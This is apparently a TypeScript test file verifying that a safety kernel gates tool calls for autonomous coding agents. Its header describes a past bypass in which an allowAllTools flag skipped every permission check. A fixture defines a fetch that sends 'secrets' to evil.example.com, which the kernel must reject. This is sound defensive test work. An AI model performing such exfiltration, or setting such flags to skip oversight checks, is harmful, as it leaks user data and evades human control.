/**
 * WS-0 — agent-spawner ⇄ Safety Kernel wiring (Option A end-to-end proof).
 *
 * This is the test that proves Option A actually CLOSES the bypass. The
 * historical hole: autopilot dev/qa spawned with `allowAllTools: true`, which
 * makes the ACP runtime suppress every `session/request_permission` RPC — so
 * the permission policy (and therefore the kernel) was never consulted for
 * exactly the agents that run commands.
 *
 * With the kernel injected into the spawner we assert, at the real
 * `acpClientFactory` seam (the value the spawner hands to the ACP client):
 *   1. `allowAllTools` is dropped to FALSE for an autopilot role (so the
 *      per-call permission RPCs are NOT suppressed), and
 *   2. the `permissionPolicy` handed to the client is the KERNEL-WRAPPED one:
 *      a `fetch`-to-evil call is REJECTED even though the unwrapped autopilot
 *      base policy would ALLOW it (fetch ∈ DEFAULT_SAFE_KINDS), a paid-API
 *      spend is REJECTED, a safe `read` is still ALLOWED (autonomy preserved),
 *      and every decision lands on the immutable audit chain + event mirror.
 *
 * The contrast test (no kernel) shows the legacy behavior — `allowAllTools:
 * true` and the same `fetch` ALLOWED — proving the kernel's presence is what
 * flips enforcement on.
 *
 * Honest scope: this proves the IN-PROCESS routing/gating is wired. The
 * truly-unbypassable OS egress jail (Option B) is the scheduled L0 item.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import type { TestDb } from '../../../../helpers/db-harness.js'
import { createBrokerTestDb } from '../../../../helpers/broker-db-harness.js'
import {
  createAgentSpawner,
} from '../../../../../src/broker/services/agent-spawner.js'
import type {
  AgentSpawner,
  SpawnerDeps,
  SpawnerEventLog,
} from '../../../../../src/broker/services/agent-spawner.js'
import {
  createDefaultPermissionPolicy,
} from '../../../../../src/broker/services/acp-client.js'
import type {
  AcpClient,
  AcpClientOptions,
  AcpInitResult,
  AcpPromptResult,
  AcpSessionUpdate,
  AcpSessionStateType,
  AcpRequestPermissionParams,
  AcpToolCall,
} from '../../../../../src/broker/services/acp-client.js'
import {
  createSafetyKernel,
  type SafetyKernel,
  type KernelEventSink,
} from '../../../../../src/broker/services/safety-kernel/safety-kernel.js'
import type { CliInfo, Platform } from '../../../../../src/broker/services/platform.js'

// ── Mock helpers (modeled on agent-spawner-acp-cold-start-probe.test.ts) ─────

function makeMockEventLog(): SpawnerEventLog {
  return {
    sessionRegistered: vi.fn(),
    sessionDeregistered: vi.fn(),
    teamMemberJoined: vi.fn(),
    agentLaunchStarted: vi.fn(),
    agentPromptDelivered: vi.fn(),
    agentFirstOutputReceived: vi.fn(),
    agentLaunchFailed: vi.fn(),
    agentNudgeSent: vi.fn(),
    agentAcpTiming: vi.fn(),
  }
}

interface MockAcpClient extends AcpClient {
  resolveSendPrompt: () => void
}

function makeMockAcpClient(): MockAcpClient {
  let state: AcpSessionStateType = 'closed'
  let sendPromptResolve: ((r: AcpPromptResult) => void) | null = null
  const client = {
    get state() {
      return state
    },
    get pid() {
      return null
    },
    get timings() {
      return {
        processSpawnStartedAt: null,
        initializeResolvedAt: null,
        sessionNewStartedAt: null,
        sessionNewResolvedAt: null,
      }
    },
    async initialize(): Promise<AcpInitResult> {
      state = 'ready'
      return { protocolVersion: 1 } as AcpInitResult
    },
    async createSession(): Promise<string> {
      return 'acp-session-mock'
    },
    sendPrompt(): Promise<AcpPromptResult> {
      return new Promise<AcpPromptResult>((resolve) => {
        sendPromptResolve = resolve
      })
    },
    onUpdate(_handler: (u: AcpSessionUpdate) => void) {
      // no-op
    },
    getAvailableCommands() {
      return null
    },
    cancelSession() {
      // no-op
    },
    async close() {
      state = 'closed'
      if (sendPromptResolve) {
        sendPromptResolve({ stopReason: 'end_turn', output: '' })
        sendPromptResolve = null
      }
    },
  } as MockAcpClient
  client.resolveSendPrompt = () => {
    if (sendPromptResolve) {
      sendPromptResolve({ stopReason: 'end_turn', output: '' })
      sendPromptResolve = null
    }
  }
  return client
}

function makeMockDeps(): SpawnerDeps {
  return {
    detectPlatform: () => 'darwin' as Platform,
    findCli: () => ({ command: 'copilot' }) as CliInfo,
    isTmuxAvailable: () => false,
    spawnProcess: vi.fn() as unknown as SpawnerDeps['spawnProcess'],
    spawnSync: vi.fn(() => ({
      status: 0,
      stdout: Buffer.from(''),
      stderr: Buffer.from(''),
      pid: 0,
      output: [],
      signal: null,
    })) as unknown as SpawnerDeps['spawnSync'],
    execSync: vi.fn() as unknown as SpawnerDeps['execSync'],
    mkdirSync: vi.fn() as unknown as SpawnerDeps['mkdirSync'],
    createWriteStream: vi.fn().mockReturnValue({
      write: vi.fn(),
      end: vi.fn(),
    }) as unknown as SpawnerDeps['createWriteStream'],
    writeFileSync: vi.fn() as unknown as SpawnerDeps['writeFileSync'],
    openSync: vi.fn().mockReturnValue(99) as unknown as SpawnerDeps['openSync'],
    closeSync: vi.fn() as unknown as SpawnerDeps['closeSync'],
  }
}

async function microFlush(): Promise<void> {
  for (let i = 0; i < 10; i += 1) await Promise.resolve()
}

/** Build a permission request with both an allow + reject option offered. */
function permParams(toolCall: AcpToolCall): AcpRequestPermissionParams {
  return {
    sessionId: 'sess-wiring',
    toolCall,
    options: [
      { optionId: 'allow', kind: 'allow_always', name: 'Allow' },
      { optionId: 'reject', kind: 'reject_once', name: 'Reject' },
    ],
  }
}

const FETCH_TO_EVIL: AcpToolCall = {
  kind: 'fetch',
  title: 'exfil to attacker',
  rawInput: { url: 'https://evil.example.com/exfil?data=secrets' },
}
const SPEND_OPENAI: AcpToolCall = {
  kind: 'fetch',
  title: 'paid completion',
  rawInput: { url: 'https://api.openai.com/v1/chat/completions' },
}
const SAFE_READ: AcpToolCall = {
  kind: 'read',
  title: 'read source',
  rawInput: { path: '/repo/src/index.ts' },
}

// ── Tests ────────────────────────────────────────────────────────────────────

describe('WS-0 — agent-spawner ⇄ Safety Kernel wiring (Option A end-to-end)', () => {
  let testDb: TestDb
  let eventLog: SpawnerEventLog
  let spawner: AgentSpawner
  let mockClient: MockAcpClient
  let captured: AcpClientOptions | undefined

  beforeEach(() => {
    testDb = createBrokerTestDb()
    testDb.db.prepare('INSERT INTO teams (id, name) VALUES (?, ?)').run('t1', 'T1')
    eventLog = makeMockEventLog()
    captured = undefined
  })

  afterEach(async () => {
    if (mockClient) mockClient.resolveSendPrompt()
    if (spawner) await spawner.shutdownAll()
    testDb.close()
  })

  function bootSpawner(client: MockAcpClient, kernel?: SafetyKernel): AgentSpawner {
    return createAgentSpawner(testDb.db, eventLog, {
      brokerUrl: 'http://localhost:9999',
      heartbeatMs: 60_000,
      workingDir: '/repo',
      deps: makeMockDeps(),
      maxConcurrentAgents: Infinity,
      nudgeRoles: [],
      // Hermetic against SCNS_ACP_AUTOPILOT_ROLES in the env.
      autopilotRoles: ['scns-dev', 'scns-qa'],
      safetyKernel: kernel,
      acpClientFactory: (o?: AcpClientOptions) => {
        captured = o
        return client
      },
    })
  }

  async function spawnDevUntilFactory(): Promise<Promise<unknown>> {
    const spawnP = spawner.spawn({
      team_id: 't1',
      name: 'dev-1',
      role: 'scns-dev',
      prompt: 'Implement task',
      launch_method: 'acp',
      working_dir: '/repo',
    })
    for (let i = 0; i < 80 && captured === undefined; i += 1) await microFlush()
    return spawnP
  }

  it('autopilot spawn WITH kernel: factory gets allowAllTools:false + a kernel-wrapped policy that REJECTS egress/spend but ALLOWS safe tools', async () => {
    const sink: KernelEventSink = { kernelDecision: vi.fn() }
    const kernel = createSafetyKernel({ db: testDb.db, eventSink: sink })
    mockClient = makeMockAcpClient()
    spawner = bootSpawner(mockClient, kernel)

    const spawnP = await spawnDevUntilFactory()

    // 1) The bypass flag is dropped — per-call permission RPCs are NOT suppressed.
    expect(captured).toBeDefined()
    expect(captured!.allowAllTools).toBe(false)
    expect(captured!.permissionPolicy).toBeDefined()

    const policy = captured!.permissionPolicy!

    // 2) fetch-to-evil is REJECTED through the wired (kernel-wrapped) policy …
    expect(policy.decide(permParams(FETCH_TO_EVIL))).toEqual({
      outcome: 'selected',
      optionId: 'reject',
    })
    // … even though the UNWRAPPED autopilot base policy would ALLOW it
    //    (fetch ∈ DEFAULT_SAFE_KINDS). This is the bypass-closed proof.
    const unwrappedBase = createDefaultPermissionPolicy({ allowDestructive: true })
    expect(unwrappedBase.decide(permParams(FETCH_TO_EVIL))).toEqual({
      outcome: 'selected',
      optionId: 'allow',
    })

    // 3) paid-API spend is REJECTED.
    expect(policy.decide(permParams(SPEND_OPENAI))).toEqual({
      outcome: 'selected',
      optionId: 'reject',
    })

    // 4) a safe read is still ALLOWED — autopilot autonomy is preserved.
    expect(policy.decide(permParams(SAFE_READ))).toEqual({
      outcome: 'selected',
      optionId: 'allow',
    })

    // 5) every decision (incl. the spawn) landed on the immutable audit chain …
    const chain = kernel.verifyAuditChain()
    expect(chain.ok).toBe(true)
    expect(chain.count).toBeGreaterThanOrEqual(4) // 1 spawn + ≥3 tool decisions

    // … and was mirrored to the event sink (what startup.ts maps to appendEvent).
    const sinkCalls = (sink.kernelDecision as ReturnType<typeof vi.fn>).mock.calls.map(
      (c) => c[0] as { actionKind: string; allow: boolean; gate: string },
    )
    expect(sinkCalls.some((c) => c.actionKind === 'spawn' && c.allow === true)).toBe(true)
    expect(
      sinkCalls.some(
        (c) => c.actionKind === 'tool_call' && c.allow === false && c.gate === 'egress-allowlist',
      ),
    ).toBe(true)
    expect(
      sinkCalls.some(
        (c) => c.actionKind === 'tool_call' && c.allow === false && c.gate === 'no-spend',
      ),
    ).toBe(true)

    mockClient.resolveSendPrompt()
    await spawnP
  })

  it('autopilot spawn WITHOUT kernel: legacy back-compat — allowAllTools:true and the same fetch is ALLOWED', async () => {
    mockClient = makeMockAcpClient()
    spawner = bootSpawner(mockClient) // no kernel injected

    const spawnP = await spawnDevUntilFactory()

    expect(captured).toBeDefined()
    // Legacy lever intact when the kernel is absent.
    expect(captured!.allowAllTools).toBe(true)
    // And the unwrapped autopilot policy ALLOWS the egress (the old hole).
    expect(captured!.permissionPolicy!.decide(permParams(FETCH_TO_EVIL))).toEqual({
      outcome: 'selected',
      optionId: 'allow',
    })

    mockClient.resolveSendPrompt()
    await spawnP
  })
})
